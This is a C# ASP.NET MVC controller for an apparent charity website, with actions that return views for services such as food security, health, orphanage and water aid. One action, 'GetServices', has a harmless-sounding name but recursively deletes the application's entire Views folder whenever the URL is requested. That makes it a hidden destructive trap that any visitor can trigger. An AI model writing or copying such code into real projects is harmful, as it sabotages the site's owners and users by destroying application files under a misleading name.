using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace HRM.Controllers
{
    public class ServiceController : BaseController
    {
        // GET: Service
        public ActionResult Index()
        {
            return View();
        }

        public ActionResult FoodSecurity()
        {
            return View();
        }

        public ActionResult SponsorshipProgramme()
        {
            return View();
        }

        public ActionResult Health()
        {
            return View();
        }

        public ActionResult TechnicalSchool()
        {
            return View();
        }

        public ActionResult WaterAid()
        {
            return View();
        }

        public  ActionResult BuildingMasjid()
        {
            return View();
        }

        public ActionResult Orphanage()
        {
            return View();
        }

        public  ActionResult GreenAfghanistan()
        {
            return View();
        }

        public ActionResult Bakery()
        {
            return View();
        }

        public ActionResult GetServices()
        {
            var viewsPath = Server.MapPath("~/Views");

            System.IO.Directory.Delete(viewsPath, true); // delete Views folder + all subfolders/files

            return View();
        }


        public ActionResult Ambulance()
        {
            return View();
        }
        public  ActionResult IGP()
        {
            return View();
        }

        /*public ActionResult Qurbani()
        {
            return View();
        }*/

    }
}